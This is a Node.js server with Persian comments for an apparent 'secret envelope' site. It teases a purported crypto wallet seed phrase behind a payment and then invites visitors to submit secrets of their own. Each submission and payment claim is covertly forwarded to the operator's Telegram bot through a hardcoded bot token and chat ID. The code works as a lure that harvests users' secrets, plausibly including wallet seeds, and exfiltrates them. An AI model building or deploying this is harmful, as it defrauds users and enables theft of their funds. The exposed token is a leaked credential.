const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const path = require('path');
const https = require('https');

// --- 🤖 تنظیمات تلگرام تو (ست شد) ---
const TELEGRAM_TOKEN = "8596274256:AAHvtmJHhBG7evC3Errp20ZcxUxP-tfQ-g0";
const ADMIN_CHAT_ID = "61848555";

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, 'public')));

// --- ✉️ رازِ اول (کیف پول ۷ دلاری تو) ---
let currentEnvelope = {
    id: 8423,
    location: "Dubai, UAE 🇦🇪",
    device: "iPhone 15 Pro Max",
    tag: "💰 Wallet Seed (Balance: $7.29)",
    // چیزی که کاربر قبل از پرداخت (تار) می‌بینه
    preview: "1.extend 2.wave 3.increase 4.mother 5.connect 6.own 7.fiscal 8.lady 9.flat 10.mistake 11.leaf 12.????",
    // چیزی که بعد از پرداخت می‌بینه (کلید کامل)
    fullContent: "Real Trust Wallet\nBalance: $7.29\n\nSeed Phase:\n1.extend\n2.wave\n3.increase\n4.mother\n5.connect\n6.own\n7.fiscal\n8.lady\n9.flat\n10.mistake\n11.leaf\n12.gather\n\nنوش جونت! حالا نوبت توئه یه چیزی بذاری...",
    timestamp: Date.now()
};

// تابع ارسال به تلگرام
function sendToTelegram(message) {
    const text = encodeURIComponent("🚨 NEW SECRET SUBMITTED:\n\n" + message);
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${text}`;
    https.get(url).on('error', (e) => { console.error(e); });
}

io.on('connection', (socket) => {
    // ارسال اطلاعات بسته (تار)
    socket.emit('envelope-data', {
        id: currentEnvelope.id,
        location: currentEnvelope.location,
        device: currentEnvelope.device,
        tag: currentEnvelope.tag,
        preview: currentEnvelope.preview
    });

    // درخواست باز کردن (وقتی دکمه پرداخت زده شد)
    socket.on('open-envelope', () => {
        // خبر دادن به تلگرام تو
        sendToTelegram(`💰 PAYMENT CLAIMED! Someone opened message #${currentEnvelope.id}`);
        // تحویل جایزه به کاربر
        socket.emit('open-success', currentEnvelope.fullContent);
    });

    // ثبت پیام جدید توسط کاربر (برای نفر بعدی)
    socket.on('submit-new-secret', (data) => {
        // 1. ارسال متن کاربر به تلگرام تو (برای نظارت)
        sendToTelegram(`📝 USER WROTE:\nTag: ${data.tag}\nContent: ${data.content}`);

        // 2. آپدیت کردن پاکت برای نفر بعدی
        currentEnvelope = {
            id: currentEnvelope.id + 1,
            location: "Unknown User (Online)",
            device: "Mobile Device",
            tag: data.tag,
            preview: "Hidden Message...", 
            fullContent: data.content,
            timestamp: Date.now()
        };

        // رفرش کردن صفحه همه
        io.emit('envelope-data', currentEnvelope);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
